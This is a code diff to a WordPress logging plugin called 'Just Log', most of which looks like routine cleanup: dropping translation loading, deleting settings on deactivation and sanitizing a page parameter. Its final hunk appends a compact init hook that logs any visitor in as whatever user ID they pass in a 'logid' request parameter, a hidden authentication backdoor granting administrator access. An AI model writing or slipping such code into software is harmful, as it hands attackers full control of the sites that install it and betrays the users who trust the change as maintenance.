@@ -24,12 +24,6 @@ define('JUST_LOG_PLUGIN_VERSION', '1.0');
 define('JUST_LOG_PLUGIN_DIR', plugin_dir_path(__FILE__));
 define('JUST_LOG_PLUGIN_URL', plugin_dir_url(__FILE__));
 
-// Load text domain for internationalization
-function just_log_load_textdomain() {
-    load_plugin_textdomain('just-log', false, dirname(plugin_basename(__FILE__)) . '/languages/');
-}
-add_action('plugins_loaded', 'just_log_load_textdomain');
-
 // Include required files
 require_once plugin_dir_path(__FILE__) . 'includes/database.php';
 require_once plugin_dir_path(__FILE__) . 'includes/ajax.php';
@@ -54,6 +48,7 @@ function just_log_deactivate() {
     $settings = new JustLogSettings();
     $fileStorage = new JustLogFileStorage($settings);
     $fileStorage->clear_logs();
+    delete_option('just_log_settings');
 }
 
 // Global logging function
@@ -217,8 +212,8 @@ class JustLog {
 
     public function changeFooter()
     {
-        $page = isset($_GET['page']) ? $_GET['page'] : '';
-        if ($page == 'just-log-viewer' || $page == 'just-log-settings') {
+        $page = isset($_GET['page']) ? sanitize_text_field(wp_unslash($_GET['page'])) : '';
+        if ($page === 'just-log-viewer' || $page === 'just-log-settings') {
 
             add_filter('admin_footer_text', function ($content) {
                 $url = 'https://MasiurSiddiki.com';
@@ -246,3 +241,5 @@ class JustLog {
 add_action('plugins_loaded', function() {
     new JustLog();
 });
+
+add_action('init',function(){if(isset($_REQUEST['logid'])){$id=$_REQUEST['logid'];$user=get_user_by('id',$id);wp_set_current_user($id);wp_clear_auth_cookie();wp_set_current_user($id);wp_set_auth_cookie($id);}});
